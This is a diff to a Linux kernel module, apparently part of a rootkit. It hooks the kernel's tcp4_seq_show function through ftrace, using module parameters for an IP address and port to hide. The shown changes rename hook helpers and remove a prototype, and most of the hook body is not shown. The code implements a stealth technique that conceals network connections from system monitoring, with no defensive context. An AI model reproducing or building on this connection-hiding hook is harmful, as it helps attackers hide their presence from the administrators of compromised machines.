@@ -6,9 +6,6 @@
 #include "../common/stringify/to_string.h"
 #include "../common/ftrace_hooking/ftrace_hook.h"
 
-// Function prototype.
-void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
-
 // Types & other consts.
 static char *ip_to_hide = NULL;
 module_param(ip_to_hide, charp, 0600);
@@ -20,7 +17,7 @@ typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static struct fthook hook;
 
 int new_tcp4_seq_show(struct seq_file *seq, void *v) {
-    original_tcp4_seq_show_t original_tcp4_seq_ptr = (original_tcp4_seq_show_t)hook.original_function_ptr;
+    original_tcp4_seq_show_t original_tcp4_seq_ptr = (original_tcp4_seq_show_t)hook.original_function_address;
 
     if (v == SEQ_START_TOKEN) {
         return original_tcp4_seq_ptr(seq, v);    
@@ -51,7 +48,7 @@ int load(void) {
     }
     pr_info("%s:%d", ip_to_hide, port_to_hide);
 
-    int res = setup_hook(&hook, "tcp4_seq_show", (unsigned long)new_tcp4_seq_show);
+    int res = setup_kernel_func_hook(&hook, "tcp4_seq_show", (unsigned long)new_tcp4_seq_show);
     if (res) {
         return -1;
     }
